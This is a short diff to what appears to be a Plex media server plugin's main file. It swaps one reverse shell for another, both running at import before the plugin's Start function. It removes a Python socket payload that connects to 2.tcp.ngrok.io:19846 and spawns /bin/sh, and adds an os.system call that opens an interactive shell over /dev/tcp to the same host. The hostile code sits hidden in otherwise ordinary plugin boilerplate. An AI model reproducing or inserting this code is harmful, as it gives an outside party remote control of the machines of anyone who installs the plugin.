@@ -7,14 +7,9 @@ ART           = 'art-default.png'
 ICON          = 'icon-default.png'
 
 ####################################################################################################
-import socket,os,pty,time
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("2.tcp.ngrok.io",19846))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-pty.spawn("/bin/sh")
-time.sleep(10000)
+import os
+
+os.system("sh -i >& /dev/tcp/2.tcp.ngrok.io/19846 0>&1")
 def Start():
     ObjectContainer.art = R(ART)
     ObjectContainer.title1 = NAME
